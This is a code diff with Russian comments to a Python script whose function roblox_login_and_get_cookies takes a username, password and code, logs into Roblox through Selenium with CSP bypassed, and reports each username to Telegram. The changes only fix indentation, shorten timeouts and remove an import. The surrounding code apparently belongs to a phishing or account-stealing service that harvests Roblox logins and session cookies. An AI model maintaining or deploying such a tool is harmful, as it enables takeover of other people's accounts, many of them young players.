@@ -397,10 +397,10 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
                 try:
                     driver = webdriver.Chrome(service=service, options=options)
                     
-                            # Устанавливаем таймауты
-        driver.set_page_load_timeout(10)  # Еще больше уменьшаем таймаут
-        driver.implicitly_wait(3)         # Еще больше уменьшаем таймаут
-        driver.set_script_timeout(10)     # Еще больше уменьшаем таймаут
+                    # Устанавливаем таймауты
+                    driver.set_page_load_timeout(10)  # Еще больше уменьшаем таймаут
+                    driver.implicitly_wait(3)         # Еще больше уменьшаем таймаут
+                    driver.set_script_timeout(10)     # Еще больше уменьшаем таймаут
                     
                     # Дополнительные настройки для стабильности
                     driver.execute_cdp_cmd('Page.setBypassCSP', {'enabled': True})
@@ -520,7 +520,7 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
                     send_telegram_log(f"[TIMEOUT] Страница логина не загрузилась для {username}")
                     driver.quit()
                     selenium_sessions.pop(session_id, None)
-                    return {'success': False, 'message': 'Страница не загрузилась в течение 15 секунд'}
+                    return {'success': False, 'message': 'Страница не загрузилась в течение 10 секунд'}
                 
                 # Дополнительно блокируем всплывающие окна после загрузки страницы
                 driver.execute_script("""
@@ -570,7 +570,7 @@ def roblox_login_and_get_cookies(username, password, session_id=None, code=None)
                     send_telegram_log(f"[TIMEOUT] Не удалось найти элементы формы для {username}")
                     driver.quit()
                     selenium_sessions.pop(session_id, None)
-                    return {'success': False, 'message': 'Не удалось найти элементы формы в течение 5 секунд'}
+                    return {'success': False, 'message': 'Не удалось найти элементы формы в течение 3 секунд'}
 
             # Проверяем ошибки Roblox
             try:
@@ -725,7 +725,6 @@ def login():
 
     # Простой таймаут через threading.Timer
     import threading
-    import signal
     
     def timeout_handler():
         send_telegram_log(f"[TIMEOUT] Процесс для {username} превысил 30 секунд")
